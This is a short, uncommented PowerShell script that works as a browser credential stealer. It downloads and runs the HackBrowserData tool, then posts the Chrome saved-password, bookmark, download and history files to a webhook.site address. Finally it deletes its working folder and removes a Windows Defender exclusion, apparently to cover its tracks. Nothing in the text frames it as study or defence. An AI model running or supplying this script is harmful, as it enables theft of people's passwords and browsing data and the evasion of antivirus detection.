curl https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.4/hack-browser-data-windows-32bit.zip -OutFile C:\a\hack-browser-data-windows-32bit.zip
Expand-Archive -LiteralPath C:\a\hack-browser-data-windows-32bit.zip -DestinationPath C:\a\
C:\a\hack-browser-data-windows-32bit.exe
Invoke-WebRequest -Uri https://webhook.site/961aad4b-5215-4f52-b6a5-e8755e68f401 -Method Post -Infile C:\a\results\chrome_default_password.csv  -UseBasicParsing
Invoke-WebRequest -Uri https://webhook.site/961aad4b-5215-4f52-b6a5-e8755e68f401 -Method Post -Infile C:\a\results\chrome_default_bookmark.csv  -UseBasicParsing
Invoke-WebRequest -Uri https://webhook.site/961aad4b-5215-4f52-b6a5-e8755e68f401 -Method Post -Infile C:\a\results\chrome_default_download.csv  -UseBasicParsing
Invoke-WebRequest -Uri https://webhook.site/961aad4b-5215-4f52-b6a5-e8755e68f401 -Method Post -Infile C:\a\results\chrome_default_history.csv  -UseBasicParsing
cd ..
Remove-Item -Path "C:\a" -Recurse
Remove-MpPreference -ExclusionPath "C:\a\"
